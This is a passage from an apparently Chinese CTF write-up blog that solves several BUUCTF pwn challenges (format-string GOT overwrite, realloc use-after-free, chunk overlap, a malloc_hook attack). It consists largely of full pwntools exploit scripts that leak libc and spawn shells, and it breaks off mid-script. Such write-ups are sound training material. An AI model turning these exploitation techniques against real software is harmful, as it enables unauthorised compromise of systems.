class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset0 <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> system_addr <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">';/bin/sh'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>由于printf的地址和system的地址只有后5位不一样，所以我们修改后三个字节即可，不过这里我们依然修改后四个字节，</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span></code></pre><p>这一句是修改后两个字节，-9是因为前面还会输出<strong>Repeater:</strong>，即已经输出了9个字节，所以我们要减去9</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span></code></pre><p>这一句则是修改倒数第三和第四个字节，由于已经输出了<strong>offset0</strong>个字节，所以要减去<strong>offset0</strong></p><p>剩下的payload就是八字节对齐，把printf和printf+2放在对应的位置上</p><h2 id="0x5-roarctf-2019-realloc-magic"><a href="#0x5-roarctf-2019-realloc-magic" class="headerlink" title="0x5.roarctf_2019_realloc_magic"></a>0x5.roarctf_2019_realloc_magic</h2><p>这题考点在于realloc，函数原型如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token punctuation">[</span>size_t<span class="token punctuation">]</span>new_size <span class="token punctuation">)</span></code></pre><p><strong>ptr</strong> 为需要重新分配的内存空间指针，<strong>new_size</strong>为新的内存空间的大小</p><p>具体用法为</p><blockquote><p>size == 0 ，這個時候等同於free<br>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 這個時候等同於malloc<br>malloc_usable_size(realloc_ptr) &gt;= size， 這個時候等同於edit<br>malloc_usable_size(realloc_ptr) &lt; szie， 這個時候才是malloc一塊更大的記憶體，將原來的內容複製過去，再將原來的chunk給free掉</p></blockquote><p>即，根据ptr和size值的不同，realloc将有free，malloc，edit和extend四种功能再回到题目来</p><p>程序保护全开，有三个功能</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/11.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/12.jpg" alt=""></p><p>re功能就是通过realloc分配chunk</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/13.jpg" alt=""></p><p>fr功能就是free掉当前指针指向的chunk，存在uaf漏洞</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/14.jpg" alt=""></p><p>ba功能就是将指针清零，只能使用一次</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/15.jpg" alt=""></p><p>由于程序缺少show功能，所以我们需要改stdout来泄露地址，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#!coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">realloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># fill tcache</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># to unsortbin fd->arena</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x180</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># overlap</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get _IO_2_1_stdout_  修改flag和write_base</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get_libc</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>                    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3e82a0</span>      <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3e82a0</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f322</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"free_hook => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x260</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x128</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 29807)</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_realloc_magic'</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x6-ciscn-2019-final-5"><a href="#0x6-ciscn-2019-final-5" class="headerlink" title="0x6.ciscn_2019_final_5"></a>0x6.ciscn_2019_final_5</h2><p>这题的洞很不好找，<del>还是因为我太菜了</del>，首先检查程序保护机制</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/16.jpg" alt=""></p><p>got表可写，无PIE</p><p>共有增删改三个功能</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/17.jpg" alt=""></p><p>漏洞点存在于add功能中</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/18.jpg" alt=""></p><p>sub_400AB0函数功能如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/19.jpg" alt=""></p><p>返回两个两个参数按位或之后的值，然后将这个值存入<strong>0x6020e0</strong>中，<strong>0x6020e0</strong>是一个数组，并且，这个程序中存储chunk的地址不是按照我们输入的序号来存的，而是从头遍历数组，依次存入地址</p><p>当我们分配第一个chunk且输入序号为16时，返回指针的后三位是0x260，然后0x260|16=0x270，最终存入数组中的地址的后三位为0x270，这样我们就可以在0x270处伪造一个chunk头，造成chunkoverlap</p><p>然后，这题有一点很🐕，就是在edit功能中</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/20.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/21.jpg" alt=""></p><p>这个函数会将content[i]与0xf按位与，当content[i]&amp;0xf==index时，就往content[i]&amp;0xFFFFFFFFFFFFFFF0处写数据，先贴上exp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#r = remote("node3.buuoj.cn", 28849)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_final_5"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ciscn_final_5"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0x6020e0</span>free_got <span class="token operator">=</span> <span class="token number">0x602018</span>puts_plt <span class="token operator">=</span> <span class="token number">0x400790</span>puts_got <span class="token operator">=</span> <span class="token number">0x602020</span>atoi_got <span class="token operator">=</span> <span class="token number">0x602078</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aa\n'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aaa\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>atoi_got<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">17</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"puts:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>通过构造overlap，我们将chunk分配到了content数组处，并将content前几个值修改为了<strong>p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)</strong></p><p>然后我们需要将<strong>free@got</strong>修改为puts函数，根据edit的要求，我们输入index为8，<strong>content[0]=free@got=0x602018,0x602018&amp;0xf=8==index,0x602018&amp;0xFFFFFFFFFFFFFFF0=0x602010</strong>,所以最终我们是往0x602010处写数据，于是传入两个<strong>puts_plt</strong>，将<strong>free@got</strong>修改为<strong>put_plt</strong>，然后delete(1),相当于puts(1),由于puts@got的最后一位是0，微调一下+1，后面的就是修改<strong>atoi</strong>为<strong>system</strong>，步骤和前面修改free@got差不多。</p><h2 id="0x7-gyctf-2020-some-thing-interesting"><a href="#0x7-gyctf-2020-some-thing-interesting" class="headerlink" title="0x7.gyctf_2020_some_thing_interesting"></a>0x7.gyctf_2020_some_thing_interesting</h2><p>虽然保护全开，但是无什么难度，存在uaf，并且还给了一个格式化字符串漏洞来泄露地址，所以先泄露地址然后uaf打malloc_hook，exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_some_thing_interesting')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29702</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_some_thing_interesting'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> sizere<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size0<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sizere<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token 